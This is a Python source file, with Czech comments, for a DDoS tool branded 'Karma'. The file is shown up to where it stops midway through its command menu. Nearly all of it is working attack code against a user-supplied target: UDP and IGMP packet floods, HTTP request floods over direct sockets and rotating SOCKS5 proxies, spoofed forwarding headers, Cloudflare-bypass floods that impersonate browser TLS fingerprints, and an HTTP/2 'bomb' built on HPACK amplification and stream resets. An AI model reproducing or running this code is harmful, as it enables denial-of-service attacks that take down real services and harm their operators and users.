# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init

# Volitelné pokročilé knihovny
try:
    from curl_cffi import requests as curl_requests
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False

try:
    import tls_client
    HAS_TLS_CLIENT = True
except ImportError:
    HAS_TLS_CLIENT = False

# HTTP/2 knihovna pro h2bomb
try:
    import h2.connection
    import h2.config
    import h2.events
    HAS_H2 = True
except ImportError:
    HAS_H2 = False


# ============================================================
# Globální konfigurace
# ============================================================
SOCKET_TIMEOUT = 5
BURST_PER_SOCKET = 50
H2_BOMB_STREAMS = 200   # počet streamů na jedno připojení


def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack Done !                                   \n")
            return


def load_ua():
    if not os.path.exists('./resources'):
        os.makedirs('./resources')
    if not os.path.exists('./resources/ua.txt'):
        open('./resources/ua.txt', 'w', encoding='utf-8').write(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\n"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15\n"
        )
    return [x for x in open('./resources/ua.txt', 'r', encoding='utf-8').read().splitlines() if x.strip()]


def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc.split(":")[0]
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    return target


def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        proxies = []
        return False
    raw = open("./proxy.txt", 'r', encoding='utf-8').read().splitlines()
    proxies = []
    for line in raw:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "://" in line:
            line = line.split("://", 1)[1]
        parts = line.split(":")
        if len(parts) == 2:
            host, port = parts
            user, pwd = None, None
        elif len(parts) == 4:
            host, port, user, pwd = parts
        else:
            continue
        try:
            int(port)
        except ValueError:
            continue
        proxies.append({"host": host, "port": int(port), "user": user, "pass": pwd})
    if not proxies:
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "proxy.txt je prázdný nebo má špatný formát\n")
        return False
    auth_count = sum(1 for p in proxies if p["user"])
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Načteno {len(proxies)} proxy ({auth_count} s autentizací)\n")
    return True


def proxy_to_url(p):
    if p.get("user"):
        return f"socks5://{p['user']}:{p['pass']}@{p['host']}:{p['port']}"
    return f"socks5://{p['host']}:{p['port']}"


def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )


# ============================================================
# Socket helpers
# ============================================================
def make_socks5_socket(proxy, target, use_ssl=True):
    s = None
    try:
        s = socks.socksocket()
        s.settimeout(SOCKET_TIMEOUT)
        if proxy.get("user"):
            s.set_proxy(socks.SOCKS5, proxy["host"], proxy["port"],
                        username=proxy["user"], password=proxy["pass"])
        else:
            s.set_proxy(socks.SOCKS5, proxy["host"], proxy["port"])
        s.connect((str(target['host']), int(target['port'])))
        if use_ssl and target['scheme'] == 'https':
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        return s
    except Exception:
        try:
            if s: s.close()
        except Exception: pass
        return None


def make_direct_socket(target, use_ssl=True):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        if use_ssl and target['scheme'] == 'https':
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        return s
    except Exception:
        try:
            if s: s.close()
        except Exception: pass
        return None


# ============================================================
# Info inputy
# ============================================================
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "URL      " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t


def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "IP       " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "PORT     " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t


# ============================================================
# LAYER 4
# ============================================================
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except Exception:
            try: sock.close()
            except Exception: pass
            return


def runsender(host, port, th, t, payload=None):
    if not payload: payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.daemon = True; thd.start()
        except Exception: pass


def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except Exception:
            try: sock.close()
            except Exception: pass
            return


# ============================================================
# LAYER 7 – základní
# ============================================================
def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url, timeout=SOCKET_TIMEOUT)
            requests.head(url, timeout=SOCKET_TIMEOUT)
        except Exception: pass


def LaunchPOST(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url, timeout=SOCKET_TIMEOUT)
            requests.post(url, timeout=SOCKET_TIMEOUT)
        except Exception: pass


def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, timeout=SOCKET_TIMEOUT)
            requests.get(url, timeout=SOCKET_TIMEOUT)
        except Exception: pass


# ============================================================
# LAYER 7 – bez proxy (socket)
# ============================================================
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1); continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0: break
                s.send(str.encode(req))
        except Exception: pass
        finally:
            try: s.close()
            except Exception: pass


def LaunchPPS(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackPPS(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1); continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0: break
                s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
        except Exception: pass
        finally:
            try: s.close()
            except Exception: pass


def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackSPOOF(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1); continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0: break
                s.send(str.encode(req))
        except Exception: pass
        finally:
            try: s.close()
            except Exception: pass


# ============================================================
# LAYER 7 – s proxy (SOCKS5)
# ============================================================
def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackPXRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            p = random.choice(proxies)
            proxy_url = proxy_to_url(p)
            proxy = {'http': proxy_url, 'https': proxy_url}
            requests.get(url, proxies=proxy, timeout=SOCKET_TIMEOUT)
            requests.get(url, proxies=proxy, timeout=SOCKET_TIMEOUT)
        except Exception: pass


def LaunchPXSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = random.choice(proxies)
        s = make_socks5_socket(proxy, target)
        if s is None: continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0: break
                s.send(str.encode(req))
        except Exception: pass
        finally:
            try: s.close()
            except Exception: pass


def LaunchPXSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackPXSPOOF(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = random.choice(proxies)
        s = make_socks5_socket(proxy, target)
        if s is None: continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0: break
                s.send(str.encode(req))
        except Exception: pass
        finally:
            try: s.close()
            except Exception: pass


# ============================================================
# NOVÁ METODA: H2BOMB (HTTP/2 Bomb + MadeYouReset)
# ============================================================
def LaunchH2BOMB(url, th, t, use_proxy=False):
    """
    HTTP/2 Bomb + MadeYouReset.
    Kombinuje HPACK amplifikaci a flow-control hold pro maximalni
    vycerpani pameti serveru. Kazde vlakno otevre N streamu a drzi je.
    """
    if not HAS_H2:
        stdout.write(Fore.RED + "[!]" + Fore.WHITE + " h2 neni nainstalovano. pip install h2\n")
        return
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))

    def worker():
        while (until - datetime.datetime.now()).total_seconds() > 0:
            try:
                # Vytvorit TCP/TLS spojeni (pres proxy nebo direct)
                if use_proxy:
                    p = random.choice(proxies)
                    raw_sock = make_socks5_socket(p, target, use_ssl=False)
                    if raw_sock is None:
                        continue
                else:
                    raw_sock = make_direct_socket(target, use_ssl=False)
                    if raw_sock is None:
                        continue

                # TLS handshake
                if target['scheme'] == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(raw_sock, server_hostname=target['host'])
                else:
                    sock = raw_sock

                # HTTP/2 handshake
                config = h2.config.H2Configuration(client_side=True, header_encoding='utf-8')
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                sock.sendall(conn.data_to_send())

                # HPACK bomb: jeden velky header, ktery se opakuje
                # malymi indexy (1 bajt na referenci)
                bomb_value = "A" * 4096
                stream_id = 1

                # Odeslat N streamu, kazdy s referenci na bombu
                for i in range(H2_BOMB_STREAMS):
                    if (until - datetime.datetime.now()).total_seconds() <= 0:
                        break
                    try:
                        # Poslat HEADERS s velkym headerem
                        conn.send_headers(
                            stream_id,
                            [
                                (':method', 'POST'),
                                (':path', target['uri']),
                                (':authority', target['host']),
                                (':scheme', target['scheme']),
                                ('user-agent', random.choice(ua)),
                                ('x-bomb', bomb_value),  # HPACK reference
                            ],
                            end_stream=False
                        )
                        # Okamzity reset -> MadeYouReset princip
                        conn.reset_stream(stream_id)
                        sock.sendall(conn.data_to_send())
                        stream_id += 2
                    except Exception:
                        break

                # Drzet spojeni otevrene (Slowloris flow-control hold)
                # Tim zabranime uvolneni pameti na serveru
                hold_until = time.time() + 5
                while time.time() < hold_until and (until - datetime.datetime.now()).total_seconds() > 0:
                    try:
                        sock.settimeout(1)
                        sock.recv(1)  # cekame na WINDOW_UPDATE
                    except socket.timeout:
                        pass
                    except Exception:
                        break

                try: sock.close()
                except Exception: pass
            except Exception:
                pass

    for _ in range(int(th)):
        thd = threading.Thread(target=worker)
        thd.daemon = True
        thd.start()


# ============================================================
# CF metody – cloudscraper
# ============================================================
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except Exception: pass


def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            p = random.choice(proxies)
            proxy_url = proxy_to_url(p)
            proxy = {'http': proxy_url, 'https': proxy_url}
            scraper.get(url, proxies=proxy, timeout=SOCKET_TIMEOUT)
            scraper.get(url, proxies=proxy, timeout=SOCKET_TIMEOUT)
        except Exception: pass


# ============================================================
# CF metody – curl_cffi
# ============================================================
def LaunchCFFI(url, th, t):
    if not HAS_CURL_CFFI:
        stdout.write(Fore.RED + "[!]" + Fore.WHITE + " curl_cffi neni nainstalovano\n")
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFFI, args=(url, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackCFFI(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            ua_choice = random.choice(ua)
            curl_requests.get(url, impersonate="chrome120",
                              headers={"User-Agent": ua_choice}, timeout=SOCKET_TIMEOUT)
            curl_requests.get(url, impersonate="chrome120",
                              headers={"User-Agent": ua_choice}, timeout=SOCKET_TIMEOUT)
        except Exception: pass


def LaunchPXCFFI(url, th, t):
    if not HAS_CURL_CFFI:
        stdout.write(Fore.RED + "[!]" + Fore.WHITE + " curl_cffi neni nainstalovano\n")
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFFI, args=(url, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackPXCFFI(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            p = random.choice(proxies)
            proxy_url = proxy_to_url(p)
            proxies = {"http": proxy_url, "https": proxy_url}
            ua_choice = random.choice(ua)
            curl_requests.get(url, impersonate="chrome120",
                              headers={"User-Agent": ua_choice},
                              proxies=proxies, timeout=SOCKET_TIMEOUT)
            curl_requests.get(url, impersonate="chrome120",
                              headers={"User-Agent": ua_choice},
                              proxies=proxies, timeout=SOCKET_TIMEOUT)
        except Exception: pass


# ============================================================
# CF metody – tls_client
# ============================================================
def LaunchTLSC(url, th, t):
    if not HAS_TLS_CLIENT:
        stdout.write(Fore.RED + "[!]" + Fore.WHITE + " tls_client neni nainstalovano\n")
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackTLSC, args=(url, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackTLSC(url, until_datetime):
    session = tls_client.Session(client_identifier="chrome_120")
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            ua_choice = random.choice(ua)
            session.get(url, headers={"User-Agent": ua_choice})
            session.get(url, headers={"User-Agent": ua_choice})
        except Exception: pass


def LaunchPXTLSC(url, th, t):
    if not HAS_TLS_CLIENT:
        stdout.write(Fore.RED + "[!]" + Fore.WHITE + " tls_client neni nainstalovano\n")
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXTLSC, args=(url, until))
            thd.daemon = True; thd.start()
        except Exception: pass


def AttackPXTLSC(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            p = random.choice(proxies)
            proxy_url = proxy_to_url(p)
            session = tls_client.Session(client_identifier="chrome_120", proxy=proxy_url)
            ua_choice = random.choice(ua)
            session.get(url, headers={"User-Agent": ua_choice})
            session.get(url, headers={"User-Agent": ua_choice})
        except Exception: pass


# ============================================================
# HTTP/2 metody (puvodni)
# ============================================================
def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        th = threading.Thread(target=AttackHTTP2, args=(url, until))
        th.daemon = True; th.start()


def AttackHTTP2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            with httpx.Client(http2=True, timeout=SOCKET_TIMEOUT) as client:
                client.get(url, headers=headers)
                client.get(url, headers=headers)
        except Exception: pass


def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        th = threading.Thread(target=AttackPXHTTP2, args=(url, until))
        th.daemon = True; th.start()


def AttackPXHTTP2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            p = random.choice(proxies)
            proxy_url = proxy_to_url(p)
            with httpx.Client(http2=True, timeout=SOCKET_TIMEOUT, proxies=proxy_url) as client:
                client.get(url, headers=headers)
                client.get(url, headers=headers)
        except Exception: pass


# ============================================================
# SKY / STELLAR
# ============================================================
def attackSKY(url, timer, threads):
    for _ in range(int(threads)):
        th = threading.Thread(target=LaunchSKY, args=(url, timer))
        th.daemon = True; th.start()


def LaunchSKY(url, timer):
    target = get_target(url)
    timelol = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        proxy = random.choice(proxies)
        s = make_socks5_socket(proxy, target)
        if s is None: continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if time.time() >= timelol: break
                s.send(str.encode(req))
        except Exception: pass
        finally:
            try: s.close()
            except Exception: pass


def attackSTELLAR(url, timer, threads):
    for _ in range(int(threads)):
        th = threading.Thread(target=LaunchSTELLAR, args=(url, timer))
        th.daemon = True; th.start()


def LaunchSTELLAR(url, timer):
    target = get_target(url)
    timelol = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1); continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if time.time() >= timelol: break
                s.send(str.encode(req))
        except Exception: pass
        finally:
            try: s.close()
            except Exception: pass


# ============================================================
# UI
# ============================================================
def clear():
    if name == 'nt': system('cls')
    else: system('clear')


def title():
    stdout.write("                                                                                          \n")
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ " + Fore.LIGHTWHITE_EX + "        Welcome To The Main Screen Of Karma  " + Fore.LIGHTCYAN_EX + "       ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ " + Fore.LIGHTWHITE_EX + "          Type [help] to see the Commands    " + Fore.LIGHTCYAN_EX + "       ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")


def help():
    clear()
    stdout.write(Fore.LIGHTWHITE_EX + "\n=== KARMA HELP ===\n\n")
    stdout.write(Fore.LIGHTCYAN_EX + "Layer 7 (HTTP):\n" + Fore.WHITE)
    stdout.write("  get, post, head, soc, spoof, pps, sky, http2 (bez proxy)\n")
    stdout.write("  pxraw, pxsoc, pxspoof, pxsky, pxhttp2 (s proxy)\n")
    stdout.write(Fore.LIGHTCYAN_EX + "\nCloudflare:\n" + Fore.WHITE)
    stdout.write("  cfb, pxcfb, cffi, pxcffi, tlsc, pxtlsc\n")
    stdout.write(Fore.RED + "\nH2BOMB (NOVE - nejsilnejsi):\n" + Fore.WHITE)
    stdout.write("  h2bomb       - HTTP/2 Bomb (bez proxy)\n")
    stdout.write("  pxh2bomb     - HTTP/2 Bomb (s proxy)\n")
    stdout.write(Fore.LIGHTCYAN_EX + "\nLayer 4:\n" + Fore.WHITE)
    stdout.write("  udp, tcp\n")
    stdout.write(Fore.LIGHTCYAN_EX + "\nTools:\n" + Fore.WHITE)
    stdout.write("  dns, geoip, subnet, exit\n\n")


def layer7():
    clear()
    stdout.write(Fore.LIGHTWHITE_EX + "\n=== LAYER 7 ===\n\n")
    stdout.write(Fore.WHITE + "Bez proxy: get, post, head, soc, spoof, pps, sky, http2\n")
    stdout.write("S proxy:   pxraw, pxsoc, pxspoof, pxsky, pxhttp2\n")
    stdout.write("CF:        cfb, pxcfb, cffi, pxcffi, tlsc, pxtlsc\n")
    stdout.write(Fore.RED + "H2BOMB:    h2bomb, pxh2bomb\n\n")


def layer4():
    clear()
    stdout.write(Fore.LIGHTWHITE_EX + "\n=== LAYER 4 ===\n\n")
    stdout.write(Fore.WHITE + "udp - UDP flood\n")
    stdout.write("tcp - TCP flood\n\n")


def tools():
    clear()
    stdout.write(Fore.LIGHTWHITE_EX + "\n=== TOOLS ===\n\n")
    stdout.write(Fore.WHITE + "dns, geoip, subnet\n\n")


def command():
    stdout.write(Fore.LIGHTCYAN_EX + "╔═══" + Fore.LIGHTCYAN_EX + "[""root" + Fore.LIGHTGREEN_EX + "@" + Fore.LIGHTCYAN_EX + "Karma" + Fore.CYAN + "]" + Fore.LIGHTCYAN_EX + "\n╚══\x1b[38;2;0;255;189m> " + Fore.WHITE)
    cmd = input().strip()

    if cmd in ("cls", "clear"):
        clear(); title()
    elif cmd in ("help", "?"):
        help()
    elif cmd in ("layer7", "l7", "L7"):
        layer7()
    elif cmd in ("layer4", "l4", "L4"):
        layer4()
    elif cmd in ("tools", "tool"):
        tools()
    elif cmd == "exit":
        sys.exit()

    # --- bez proxy ---
    elif cmd in ("get", "GET"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchRAW(target, thread, t); timer.join()
    elif cmd in ("post", "POST"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchPOST(target, thread, t); timer.join()
    elif cmd in ("head", "HEAD"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchHEAD(target, thread, t); timer.join()
    elif cmd in ("soc", "SOC"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchSOC(target, thread, t); timer.join()
    elif cmd in ("spoof", "SPOOF"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchSPOOF(target, thread, t); timer.join()
    elif cmd in ("pps", "PPS"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchPPS(target, thread, t); timer.join()
